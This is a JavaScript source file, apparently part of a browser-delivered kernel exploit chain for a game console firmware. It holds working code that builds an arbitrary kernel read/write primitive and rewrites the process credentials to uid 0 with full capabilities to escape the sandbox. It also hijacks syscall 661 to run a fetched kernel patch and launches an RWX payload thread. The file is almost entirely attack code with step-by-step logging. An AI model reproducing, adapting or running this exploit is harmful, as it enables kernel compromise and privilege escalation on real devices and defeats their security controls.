        return { rv: r, err: r < 0 ? errno() : 0 };
    }
    function steer(X) {
        kSysWrite(1, 27, X.low | 0);
        kSysWrite(1, 28, X.hi | 0);
    }

    /* The public kernel R/W API -- module scope, because stagePostExploit uses
       it. Assigned here where the closures above exist. */
    kread32K = function (X) { steer(X); return kSysRead(1, 7).val >>> 0; };
    kwrite32K = function (X, v) { steer(X); return kSysWrite(1, 7, v | 0).rv; };
    read8K = function (X) {
        const lo = kread32K(X), hi = kread32K(X.add32(4));
        return new int64(lo >>> 0, hi >>> 0);
    };
    write8K = function (X, V) {
        kwrite32K(X, V.low | 0);
        kwrite32K(X.add32(4), V.hi | 0);
    };

    /* ---- five self-tests: read32, read8, heap, write32, write64 ---------- */
    const t1 = kread32K(A_OID.add32(0x10));
    mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
    check("krw-read32-image", t1 === 27, "got=" + t1);

    const t2 = read8K(A_OID.add32(0x10));
    const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 0xc0040002;
    mark("KRW-T2-READ8-IMG", "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002");
    check("krw-read8-image", t2ok, "got=" + t2);

    const uidNow = sc(SYS.getuid).i32 >>> 0;
    const t3 = kread32K(UCRED.add32(0x04));
    mark("KRW-T3-READ32-HEAP", "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow);
    check("krw-read32-heap", t3 === uidNow, "cr_uid=" + t3 + " getuid=" + uidNow);
    mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8K(UCRED));

    const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
    const o4 = kread32K(SCR4);
    kwrite32K(SCR4, 0x41424344);
    const r4 = kread32K(SCR4);
    kwrite32K(SCR4, o4 | 0);
    const b4 = kread32K(SCR4);
    mark("KRW-T4-WRITE32", "orig=" + o4 + " wrote=0x41424344 readback=0x"
        + r4.toString(16) + " restored=" + b4);
    check("krw-write32", r4 === 0x41424344 && b4 === o4,
        "readback=0x" + r4.toString(16) + " restored=" + b4);

    const SCR8 = KBASE.add32(off.k_oid_maxfiles + 0x20);
    const o8 = read8K(SCR8);
    const MAGIC8 = new int64(0xdeadbeef, 0x11223344);
    write8K(SCR8, MAGIC8);
    const r8 = read8K(SCR8);
    write8K(SCR8, o8);
    const b8 = read8K(SCR8);
    const t5ok = r8.low >>> 0 === 0xdeadbeef && r8.hi >>> 0 === 0x11223344
        && b8.low >>> 0 === o8.low >>> 0 && b8.hi >>> 0 === o8.hi >>> 0;
    mark("KRW-T5-WRITE64", "orig=" + o8 + " wrote=" + MAGIC8 + " readback=" + r8
        + " restored=" + b8);
    check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);

    const krwOk = t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok;
    mark("KRW-VERDICT", "fw=" + fwKey + " kernel_base=" + KBASE
        + " read32=" + (t1 === 27 ? 1 : 0) + " read8=" + (t2ok ? 1 : 0)
        + " heap=" + (t3 === uidNow ? 1 : 0) + " write32=" + (r4 === 0x41424344 ? 1 : 0)
        + " write64=" + (t5ok ? 1 : 0) + " armings=" + armCount
        + "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **");
    mark("KRW-API", "read8/write8/kread32/kwrite32 ready");
    if (!check("eg-krw-ok", krwOk,
        "krwOk=" + (krwOk ? 1 : 0) + " (endgame needs all 5 KRW self-tests to pass)")) {
        allDone = true;
        return null;
    }
    krwReady = true;
    return true;
}

/*
The kernFile() reader needs the mib/oldlen/buffer views, which are built once
per run. They live at driver scope so stageAnchor's oracle AND the post-exploit
tail can both call this one implementation.
*/
let kfMibAd = 0, kfMibDv = null, kfOldDv = null, kfOldAd = 0;
let kfBufDv = null, kfBufAd = 0;
const KF_BYTES = 1 << 20;

function initKernFile() {
    const mibAb = new ArrayBuffer(8); keepAlive.push(mibAb);
    kfMibDv = new DataView(mibAb); kfMibAd = bufAddr(mibAb);
    kfMibDv.setInt32(0, 1, true);
    kfMibDv.setInt32(4, KERN_FILE_NUM, true);
    const kfAb = new ArrayBuffer(KF_BYTES); keepAlive.push(kfAb);
    kfBufDv = new DataView(kfAb); kfBufAd = bufAddr(kfAb);
    const olAb = new ArrayBuffer(8); keepAlive.push(olAb);
    kfOldDv = new DataView(olAb); kfOldAd = bufAddr(olAb);
    kernFileImpl = function (withBuf, tag) {
        kfOldDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
        kfOldDv.setInt32(4, 0, true);
        const r = sc(SYS.sysctl, kfMibAd, 2, withBuf ? kfBufAd : 0, kfOldAd, 0, 0);
        const rv = r.i32, er = rv < 0 ? errno() : 0;
        const ln = kfOldDv.getUint32(0, true);
        mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
        return { rv: rv, err: er, len: ln };
    };
}

/* A convenience wrapper stageAnchor calls; delegates to the shared impl. */
function kernFile2(withBuf, tag) { return kernFileImpl(withBuf, tag); }

/* Provides the module-scope kernel R/W API + the jb handles the post-exploit
   tail uses. Declared here as let bindings assigned inside stageAnchor. */
let read8K = null, write8K = null, kread32K = null, kwrite32K = null;
let krwReady = false;
let jbUcred = null, jbSaved = null, jbRestored = false;
let kernFileImpl = null;

/* OP 2 of the post-exploit tail runs syscall 661 through this stub number; it
   is a SELECTION from LAPSE_SYS/NETCTRL_SYS, kept as a named constant so the
   arm site reads the way netctrl's does. */
const NETCTRL_KEXEC = 661;

/*
stageKrw is now a thin wrapper. The oracle itself (oid_number check, unhide,
steer-target setup, the five self-tests) runs inside stageAnchor where the node
arena and armOnce live -- see the block above this function and the comment at
its head. What remains here is the per-run kern.file buffer setup, which has to
happen before either the oracle or the post-exploit kf-scan runs.

Kept as a separate stage rather than folded into stageAnchor because the
kern.file buffer is NOT part of the leak/anchor problem: it is the first thing
the KRW half needs and the last thing the leak half cares about.
*/
async function stageKrw() {
    initKernFile();
    const base0 = kernFileImpl(false, "baseline");
    check("kf-baseline-is-enoent", base0.rv < 0 && base0.err === 2,
        "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2");
    return { base0: base0, kernFile: kernFileImpl };
}

/* ============================================================================
   STAGE 5: the post-exploit tail -- jailbreak, kpatch, payload
   ============================================================================
   Identical in order and in gates to netctrl's, reusing post-exploit.js for
   every operation the two chains share. The policy that stays HERE is the part
   the two chains legitimately disagree on (see post-exploit.js:161-196):
   the page-rounded RWX size, the ?patch=0 / ?payload=0 opt-outs, and the
   sysent restore wrapped in try/finally.
   ============================================================================ */
async function stagePostExploit(krw) {
    const { OID, O_NUM, O_VIS, O_RAN, KF_BYTES, kfDv, kfAd, kernFile } = krw;

    const sameI64Local = sameI64;
    const kptr = v => isKernelPtr(v);

    /* kernel read/write adapter for post-exploit.js's io contract. */
    function kview(base) {
        return {
            getBInt: o => read8K(base.add32(o)),
            setBInt: (o, v) => write8K(base.add32(o), v),
            getInt32: o => (kread32K(base.add32(o)) | 0),
            setInt32: (o, v) => { kwrite32K(base.add32(o), v | 0); },
        };
    }

    /* ---- kpatch blob + jmp sites ---------------------------------------- */
    const kpatchName = kpatchPath(fwKey, off);
    try { kpatch = await loadBinary(kpatchName); }
    catch (e) { mark("KPATCH-FETCH-THREW", (e && e.message) || String(e)); }
    if (kpatch) KPATCH_JMP_SITES = kpatchJmpSites(kpatch);
    mark("KPATCH-BLOB", kpatch ? "blob=" + kpatchName + " bytes=" + kpatch.length
        + " sites=" + KPATCH_JMP_SITES.length : "blob=" + kpatchName + " MISSING");

    /* options.payload is the UI selection, exactly as netctrl passes it. NOT
       off.payload -- the HEN blob is not a firmware property. */
    try { payload = await loadPayload(payloadChoice); }
    catch (e) { mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e)); }
    mark("PAYLOAD-BLOB", payload ? "file=" + selectedPayload()
        + " bytes=" + payload.length + " entry="
        + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9") : "MISSING");

    /* ---- jailbreak: root the ucred, escape the prison --------------------

       prison0 and rootvnode are DERIVED FROM THIS PROCESS, never read from
       offset.js. See NOTES-webkit-chain.md:184-199: those are static RVAs into
       a full libkernel build, and we run in the Internet Browser against
       libkernel_web.sprx where the same RVAs address different data. The
       canonical derivation is the kProc walk:

           curproc   <- p->p_ucred already in hand (CT1 is our own thread)
           kProc     <- walk p_list_next until p_pid == 0
           prison0   <- kProc.p_ucred(+0x40).cr_prison(+0x30)
           rootvnode <- kProc.p_fd(+0x48).fd_rdir(+0x10)

       Using the table's RVAs would look right and silently point the
       jailbreak writes at the wrong kernel addresses. */
    if (DO_JB) {
        const curproc = read8K(CT1.add32(TD_PROC));
        jbUcred = kptr(curproc) ? read8K(curproc.add32(P_UCRED)) : null;
        const pFd = kptr(curproc) ? read8K(curproc.add32(P_FD)) : null;

        /* Walk the process list to pid 0 and take prison0 / rootvnode off it. */
        const jail = resolvePrisonAndRoot(curproc);
        const prison0 = jail.prison0;
        const rootvn = jail.rootvnode;
        mark("JB-SOURCES", "curproc=" + curproc + " ucred=" + jbUcred
            + " krwUcred=" + UCRED + " p_fd=" + pFd
            + " kProc=" + jail.kProc + " prison0=" + prison0
            + " rootvnode=" + rootvn + " walked=" + jail.walked);

        const srcOk = kptr(curproc) && kptr(jbUcred) && kptr(pFd)
            && kptr(rootvn) && kptr(prison0) && sameI64Local(jbUcred, UCRED);
        if (check("jb-sources-are-kernel-pointers", srcOk,
            "curproc=" + curproc + " ucred=" + jbUcred + " pfd=" + pFd
            + " prison0=" + prison0 + " rootvn=" + rootvn)) {
            const U = kview(jbUcred), F = kview(pFd);
            jbSaved = {
                U, F, ucred: jbUcred, fd: pFd,
                prison: U.getBInt(CR_PRISON),
                rdir: F.getBInt(FD_RDIR), jdir: F.getBInt(FD_JDIR),
                caps1: U.getBInt(CR_SCECAPS1), caps0: U.getBInt(CR_SCECAPS0),
                uid: U.getInt32(CR_UID), ruid: U.getInt32(CR_RUID),
                svuid: U.getInt32(CR_SVUID), ngroups: U.getInt32(CR_NGROUPS),
                rgid: U.getInt32(CR_RGID),
            };
            mark("JB-SAVED", "prison=" + jbSaved.prison + " rdir=" + jbSaved.rdir
                + " jdir=" + jbSaved.jdir + " uid=" + jbSaved.uid
                + " caps=" + jbSaved.caps1 + "/" + jbSaved.caps0
                + "  (refcounted handles -- restoring these is what keeps"
                + " fdescfree/crfree balanced at process exit)");

            jbRestoreHook = function (why) {
                if (jbRestored) return true;
                F.setBInt(FD_RDIR, jbSaved.rdir);
                F.setBInt(FD_JDIR, jbSaved.jdir);
                U.setBInt(CR_PRISON, jbSaved.prison);
                U.setBInt(CR_SCECAPS1, jbSaved.caps1);
                U.setBInt(CR_SCECAPS0, jbSaved.caps0);
                U.setInt32(CR_UID, jbSaved.uid);
                U.setInt32(CR_RUID, jbSaved.ruid);
                U.setInt32(CR_SVUID, jbSaved.svuid);
                U.setInt32(CR_NGROUPS, jbSaved.ngroups);
                U.setInt32(CR_RGID, jbSaved.rgid);
                const okRdir = sameI64Local(F.getBInt(FD_RDIR), jbSaved.rdir);
                const okJdir = sameI64Local(F.getBInt(FD_JDIR), jbSaved.jdir);
                const okPr = sameI64Local(U.getBInt(CR_PRISON), jbSaved.prison);
                const okAll = okRdir && okJdir && okPr;
                mark("JB-RESTORE", why + " rdir=" + (okRdir ? 1 : 0)
                    + " jdir=" + (okJdir ? 1 : 0) + " prison=" + (okPr ? 1 : 0)
                    + " uid=" + sc(SYS.getuid).i32 + " -> " + (okAll
                        ? "fdescfree/crfree are balanced again"
                        : "NOT RESTORED -- reboot before closing the browser"));
                check("JB-RESTORED-CLEAN", okAll, "rdir/jdir/prison readback");
                jbRestored = okAll;
                return okAll;
            };

            U.setInt32(CR_UID, 0x1337);
            const probeUid = sc(SYS.getuid).i32 >>> 0;
            mark("JB-UCRED-PROBE", "wrote cr_uid=0x1337 getuid=0x"
                + probeUid.toString(16) + " match=" + (probeUid === 0x1337 ? 1 : 0));

            U.setInt32(CR_UID, 0);
            U.setInt32(CR_RUID, 0);
            U.setInt32(CR_SVUID, 0);
            U.setInt32(CR_NGROUPS, 1);
            U.setInt32(CR_RGID, 0);
            U.setBInt(CR_PRISON, prison0);
            U.setBInt(CR_SCECAPS1, NEG1);
            U.setBInt(CR_SCECAPS0, NEG1);
            F.setBInt(FD_RDIR, rootvn);
            F.setBInt(FD_JDIR, rootvn);
            mark("JB-CAPS-READBACK", "caps0=" + read8K(jbUcred.add32(0x60))
                + " caps1=" + read8K(jbUcred.add32(0x68)) + " want=-1/-1");

            const uidNow2 = sc(SYS.getuid).i32;
            const rbUid = U.getInt32(CR_UID);
            const rbPrison = U.getBInt(CR_PRISON);
            const rbRdir = F.getBInt(FD_RDIR);
            jailbroken = uidNow2 === 0 && rbUid === 0
                && sameI64Local(rbPrison, prison0) && sameI64Local(rbRdir, rootvn);
            mark("JB-ROOT", "getuid=" + uidNow2 + " cr_uid=" + rbUid
                + " cr_prison=" + rbPrison + " fd_rdir=" + rbRdir);
            check("JB-ROOT-AND-ESCAPE", jailbroken,
                "getuid=" + uidNow2 + " cr_uid=" + rbUid);
        }
    }

    /* ---- kpatch: sysent[661] -> gadget -> blob --------------------------- */
    if (jailbroken && DO_PATCH && kpatch) {
        const sysent = KBASE.add32(off.k_sysent_661);
        const gadget = KBASE.add32(off.k_jmp_rsi);
        const SV = kview(sysent);
        const saved = readSysentEntry(sysent, SV);
        const gb = read8K(gadget);
        const gadgetOk = (gb.low & 0xffff) === 0x26ff;
        let sitesOk = true;
        for (const st of KPATCH_JMP_SITES)
            if (!isGateableJumpByte(readByte(SV, KBASE.add32(st)))) sitesOk = false;

        mark("SYSENT-SAVE", "narg=" + saved.narg + " call=" + saved.call
            + " thr=" + saved.thrcnt + " gadget=" + gadget
            + "(ff26=" + (gadgetOk ? 1 : 0) + ") sitesOk=" + (sitesOk ? 1 : 0));

        if (check("kpatch-arm-gates", gadgetOk && !!kpatch && KPATCH_JMP_SITES.length >= 4
            && sitesOk && saved.narg >= 0 && saved.narg <= 8,
            "gadget=" + (gadgetOk ? 1 : 0) + " sites=" + (sitesOk ? 1 : 0)
            + " sites_n=" + KPATCH_JMP_SITES.length)) {
            const size = rwxSizeFor(kpatch.length);
            const map = mapRwxAtFixedAddress(sc, SYS, size,
                new int64(KEXEC_MAP_LO, KEXEC_MAP_HI));
            mark("KPATCH-MAP", "jitshm=" + map.fd + " mmap=" + map.i32
                + " @0x" + KEXEC_MAP_LO.toString(16));

            if (check("kpatch-rwx-map", map.fd >= 0 && map.i32 !== -1,
                "jitshm=" + map.fd + " size=0x" + size.toString(16))) {
                const dst = new int64(map.lo, map.hi);
                const copied = await copyBlobToKernel(p, int64, dst, kpatch);
                mark("KPATCH-COPY", "bytes=" + kpatch.length
                    + " copied=" + (copied.copied ? 1 : 0));

                if (check("kpatch-blob-copied", copied.copied, "")) {
                    /* Try/finally is POLICY and it stays here: a throw must not
                       leave syscall 661 armed system-wide. */
                    let rc = -1;
                    try {
                        armSysentEntry(sysent, SV, gadget);
                        const armed = sameI64Local(SV.getBInt(8), gadget);
                        mark("SYSENT-ARMED", "sy_call=" + SV.getBInt(8)
                            + " ok=" + (armed ? 1 : 0));
                        if (armed) rc = callAddr(stubAddr.get(NETCTRL_KEXEC), [dst]).i32;
                    } finally {
                        writeSysentEntry(sysent, SV, saved);
                    }
                    let allEb = true;
                    for (const st of KPATCH_JMP_SITES)
                        if ((read8K(KBASE.add32(st)).low & 0xff) !== 0xeb) allEb = false;
                    const restored = sameI64Local(SV.getBInt(8), saved.call)
                        && SV.getInt32(0) === saved.narg
                        && SV.getInt32(0x2c) === saved.thrcnt;
                    kpatched = rc === 0 && allEb && restored;
                    mark("KEXEC", "syscall(661)=" + rc + " sites_eb=" + (allEb ? 1 : 0)
                        + " sysent_restored=" + (restored ? 1 : 0));
                    check("KERNEL-PATCHED", kpatched, "rc=" + rc
                        + " allEb=" + (allEb ? 1 : 0) + " restored=" + (restored ? 1 : 0));
                }
            }
        }
    }

    /* ---- payload: map RWX, copy, pthread_create -------------------------- */
    if (kpatched && DO_PAYLOAD && payload && payload[0] === 0xe9) {
        const size = rwxSizeFor(payload.length);
        const m = mapAnonymousRwx(sc, SYS, size, int64);
        const entry = m.entry;
        const entryOk = m.i32 !== -1 && entry.hi >>> 0 > 0;
        mark("PAYLOAD-MAP", "mmap(anon,rwx,0x" + size.toString(16) + ")=" + entry
            + " err=" + (entryOk ? 0 : errno()));
        if (check("payload-rwx-map", entryOk, "map=" + entry)) {
            const copied = await copyBlobToKernel(p, int64, entry, payload);
            mark("PAYLOAD-COPY", "bytes=" + payload.length
                + " copied=" + (copied.copied ? 1 : 0));
            const resolved = resolvePthreadCreate({ p, webkitBase, libkernelBase, offsets: off, mark });
            const target = resolved.target || resolved.cand;
            mark("PTHREAD-TARGET", (resolved.target ? "resolved: " : "falling back on: ")
                + resolved.how + "  -> " + target);
            if (check("pthread-create-resolved", !!resolved.target, resolved.how)) {
                const launched = launchThread(callAddr, alloc, int64, target, entry);
                payloadRunning = launched.launched;
                mark("PAYLOAD-RUN", "pthread_create=" + launched.rc
                    + " handle=" + launched.handle);
                check("PAYLOAD-RUNNING", payloadRunning,
                    "rc=" + launched.rc + " handle=" + launched.handle);
            }
        }
    }

    /* ---- repair w1.td_ucred ----------------------------------------------
       Pass A/B wrote a wild td_ucred into w1's thread struct. If the worker
       thread is ever torn down, crfree runs on that pointer. Put the real ucred
       back. */
    try {
        const TDU = CT1.add32(TD_UCRED_OFF);
        const before = read8K(TDU);
        const wasOk = sameI64Local(before, UCRED);
        if (!wasOk) write8K(TDU, UCRED);
        const after = read8K(TDU);
        mark("JB-TDUCRED", "w1.td_ucred=" + before + " want=" + UCRED
            + " passB_restore_was_exact=" + (wasOk ? 1 : 0)
            + " repaired=" + (wasOk ? 0 : 1) + " now=" + after);
        check("JB-TDUCRED-CLEAN", sameI64Local(after, UCRED),
            "w1.td_ucred must equal the real ucred before this thread is"
            + " torn down at process exit (crfree runs on it)");
    } catch (e6) { mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6)); }

    if (jbRestoreHook && !KEEP_JB) jbRestoreHook("end-of-run");
    else if (jbRestoreHook) {
        mark("JB-KEEP", "?keepjb=1 -- jailbreak left LIVE. The handles will"
            + " be restored on pagehide; if the browser is killed instead,"
            + " REBOOT rather than closing it.");
        window.addEventListener("pagehide", function () {
            try { jbRestoreHook("pagehide"); } catch (e) { }
        });
    }

    mark("EG-VERDICT", "fw=" + fwKey + " kernel_base=" + KBASE
        + " jailbroken=" + (jailbroken ? 1 : 0) + " kpatched=" + (kpatched ? 1 : 0)
        + " payload_running=" + (payloadRunning ? 1 : 0)
        + " armings=" + armCount + " jb_restored=" + (jbRestored ? 1 : 0)
        + "  (.data/.text/caps need a reboot; the refcounted handles do not)");
}

/*
The UI's HEN selection, hoisted to driver scope.

runChain() passes the options object through to the run body, but stagePostExploit
takes no parameter -- so reading options.payload down there would be reading a
variable that is not in scope, and loadPayload() would silently fall back to its
default. netctrl.js:336-342 records this EXACT failure: the payload stage ran,
fetched the wrong file (or nothing), and the run reported success=false with no
obvious cause. Hoist it once, here, and let the stage read the binding.
*/
let payloadChoice = null;

/* ============================================================================
   The orchestrator. Everything above is stages; this is the run body that
   drives them in order and owns the finally/teardown, exactly as lapse.js and
   netctrl.js do it.
   ============================================================================ */
async function runRelapse(options) {
    options = options || {};
    payloadChoice = options.payload || null;
    try {
        const resolved = offsetsFor(navigator.userAgent);
        fwKey = resolved.key;
        off = resolved.off;
        if (!off) { state("no offsets for this firmware", "bad"); return { success: false, reason: "unsupported firmware" }; }

        const prim = await stagePrimitive();
        if (prim === false) return { success: false, reason: "primitive-stage-failed" };
        if (prim === "already-jailbroken") {
            return { success: false, alreadyJailbroken: true, reason: "already jailbroken" };
        }

        state("setting up workers and scratch page...", "warn");
        const env = await stageThreads();
        if (!env) return { success: false, reason: "threads-stage-failed" };

        state("leaking curthread and anchoring kernel base...", "warn");
        const anchor = await stageAnchor(env);
        if (anchor === "retry") return { success: false, reason: "auto-retry" };
        if (!anchor) return { success: false, reason: "anchor-stage-failed" };

        /* stageAnchor already ran the kern.file oracle and the five KRW
           self-tests (they need the node arena). stageKrw here only primes the
           kern.file buffer and takes the baseline reading for the record. */
        state("verifying kernel R/W...", "warn");
        const krw = await stageKrw();
        if (!krwReady) {
            mark("RELAPSE-STOP", "KRW not established; stopping before any .text write");
            return { success: false, reason: "krw-not-established" };
        }

        state("post-exploit: jailbreak, kpatch, payload...", "warn");
        await stagePostExploit(krw);

        /* Lapse's AIO-cleanup pattern, adapted: drain the queue now that the
           anchor and kernel R/W are up. */
        relapseAdaptCleanup("exit");

        mark("RELAPSE-SUMMARY", "fw=" + fwKey + " kernel_base=" + KBASE
            + " curthread=" + CT1 + " ucred=" + UCRED
            + " jailbroken=" + (jailbroken ? 1 : 0)
            + " kpatched=" + (kpatched ? 1 : 0)
            + " payload_running=" + (payloadRunning ? 1 : 0)
            + " armings=" + armCount
            + " pass=" + checkCounts().passCount + " fail=" + checkCounts().failCount);
        allDone = true;
        return {
            success: payloadRunning || kpatched || jailbroken,
            rebootRequired: rebootRequired || (committed && !payloadRunning),
            jailbroken: jailbroken, kpatched: kpatched, payloadRunning: payloadRunning,
        };
    } catch (e) {
        mark("THREW", (e && e.message) ? e.message : String(e));
        state("threw", "bad");
        return { success: false, reason: "threw: " + ((e && e.message) ? e.message : String(e)) };
    } finally {
        /*
        The abort path. relapseAdaptCleanup guards on sc/p/bufAddr, so an early
        failure before the primitive came up marks CLEANUP-SKIPPED and returns
        instead of throwing "bufAddr is not a function". Net effect: one place
        owns fd/internals teardown, and it runs whether the chain finished or
        threw.
        */
        try {
            if (typeof jbRestoreHook === "function") jbRestoreHook("finally");
        } catch (e5) { mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5)); }
        try { relapseAdaptCleanup("finally"); }
        catch (eC) { mark("CLEANUP-THREW", (eC && eC.message) || String(eC)); }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e2) { mark("DISARM-THREW", (e2 && e2.message) || String(e2)); }
        try { if (typeof A !== "undefined" && A) A.busy = 0; } catch (e) { }
        mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
            + " fail=" + checkCounts().failCount + (allDone ? "" : "  INCOMPLETE"));
    }
}

/*
================================================================================
relapseAdaptCleanup -- the lapse AIO-cleanup patch, re-adapted.
================================================================================

RELAPSE'S OWN CLEANUP. NOT an adaptation of lapse's -- see the file header:
relapse is the `_aio_multi_wait` concurrency bug, lapse is the
`_aio_multi_delete` double-free, and they share nothing down here.

The standalone relapse page had no cleanup pass at all: on the way out it
re-pointed node0 at N0SINK, re-sprayed the pool, and left the armings dangling
on purpose -- its own note says "workers deliberately NOT terminated: their
td_proc is corrupt and terminate() would make them syscall". That is the right
call for the WORKERS. What it was missing is the teardown of everything else
this chain opened: the submit batch, the socket pool, the kf socket, the
socketpairs, and the core/rtprio widening.

WHAT RELAPSE ACTUALLY LEAVES BEHIND

  1. a LIVE submit batch. armOnce() issues a fresh 2-entry aio_submit_cmd into
     the SAME id array every time it arms, and reapNow() only cleans it when a
     pass reaches it. An abort between armOnce() and reapNow() leaves a
     submitted batch with nothing waiting on it. Releasing it is aio_multi_cancel
     -- NOT aio_multi_delete. Delete is lapse's call and belongs to lapse's bug
     (it is the double-free there); here it would be reaching for the exact
     operation this chain is NOT built on.

  2. dangling armings. Pool sockets whose IPV6_RTHDR still points at a node in
     the arena. Neutralised the standalone way -- setNode0(0, N0SINK) plus a
     re-spray -- and it MUST happen before the closes: closing a socket whose
     rthdr aliases a live node is the corruption the whole node discipline
     exists to avoid.

  3. every fd, in reverse open order (kf socket and socketpairs are opened last
     so they close first).

  4. core/rtprio LAST. Main is pinned realtime-256 on PINCORE for the run and
     every syscall above needs that to still be in force, so restoring it is
     the final step rather than something that races the teardown.

WHERE IT RUNS

Two call sites: explicitly with "exit" at the end of a COMPLETED run, and from
runRelapse's finally with "finally" for the abort path. The guard below (sc /
p / bufAddr present) is what lets the finally call it unconditionally: if the
primitive never came up, bufAddr is not installed and every alloc() would
throw, so we mark CLEANUP-SKIPPED and return instead.

It does NOT restore the kernel .data/.text the anchor sweep touched -- relapse
marks KF-DATA-LEFT-DIRTY for that, and the boot image reloads it. A reboot
clears it; this function does not pretend otherwise.
*/
function relapseAdaptCleanup(why) {
    if (typeof sc !== "function" || typeof p === "undefined" || !p || !bufAddr) {
        mark("CLEANUP-SKIPPED", "at=" + why + " sc=" + (typeof sc)
            + " p=" + (!!p) + " bufAddr=" + (!!bufAddr));
        return;
    }
    mark("CLEANUP", "at=" + why);

    /*
    1. RELEASE THE LIVE SUBMIT BATCH.

    aio_multi_cancel is the call that retires a submitted-but-never-waited-on
    batch. Only run it if we ever armed: with no armings there is no batch, and
    armCount is the honest test for that. Best effort -- a batch that a pass
    already reaped returns an error code and that is fine.
    */
    if (armCount > 0 && typeof idAd === "number" && idAd) {
        try {
            const c = sc(SYS.aio_multi_cancel, idAd, 2, stAd).i32;
            const pl = sc(SYS.aio_multi_poll, idAd, 2, stAd).i32;
            mark("CLEANUP-BATCH", "batch=2 cancel=" + c + " poll=" + pl
                + " armings=" + armCount + " at=" + why);
        } catch (e) {
            mark("CLEANUP-BATCH-ERR", (e && e.message) || String(e));
        }
    } else {
        mark("CLEANUP-BATCH", "skipped -- no armings (armCount=0)");
    }

    /*
    2. NEUTRALISE THE DANGLING ARMINGS.

    Set node0's next pointer back to a zero-terminated sink (setNode0(0,
    N0SINK)) and re-spray the pool -- the standalone chain's PR-NEUTRALISE
    step, kept because it is what makes the leftover armings harmless. Runs
    BEFORE the closes: a pool socket whose rthdr still points into the arena is
    exactly the aliasing the node discipline exists to prevent, and closing it
    in that state is the corruption the standalone page was careful to avoid.
    */
    try {
        if (typeof setNode0Ref === "function" && pAd) {
            setNode0Ref(0, N0SINK);
            let renewed = 0;
            for (const fd of POOL)
                if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
                    renewed++;
            mark("CLEANUP-ARMINGS", "node0 -> sink, re-sprayed " + renewed
                + "/" + POOL.length + " before the closes");
        } else {
            mark("CLEANUP-ARMINGS", "skipped -- no node0 helper installed");
        }
    } catch (e) { mark("CLEANUP-ARMINGS-THREW", (e && e.message) || String(e)); }

    /* 3. close every fd relapse opened, in REVERSE order (kf socket and the
       socketpairs were opened last, so they close first). */
    let closed = 0;
    try {
        for (let i = opened.length - 1; i >= 0; --i) {
            if (typeof callAddr === "function" && stubAddr && stubAddr.has(SYS.close)
                && closeOneFd(opened[i]) === 0) closed++;
        }
        opened.length = 0;
        mark("CLEANUP-SOCKETS", "closed=" + closed);
    } catch (e) { mark("CLEANUP-SOCKETS-THREW", (e && e.message) || String(e)); }

    /* 4. core/rtprio LAST: main was realtime-256 on PINCORE and every syscall
       above needed the mask restored first. pinRestore() is the closure
       stageAnchor installed; it re-sets the saved mask and reads it back. */
    try { if (pinRestore) pinRestore(); }
    catch (e) { mark("CLEANUP-PIN-THREW", (e && e.message) || String(e)); }
    mark("CLEANUP-DONE", "at=" + why);
}

/* setNode0 is a closure inside stageAnchor; this binding exposes it to the
   cleanup pass above, which runs from a different function. Assigned at the
   top of stageAnchor. */
let setNode0Ref = null;

/* close(2) through the current gate. Kept as one place so the cleanup and the
   finally both call the same thing. */
function closeOneFd(fd) {
    if (typeof callAddr !== "function" || !stubAddr) return -1;
    const st = stubAddr.get(SYS.close);
    if (!st) return -1;
    return callAddr(st, [fd]).i32;
}
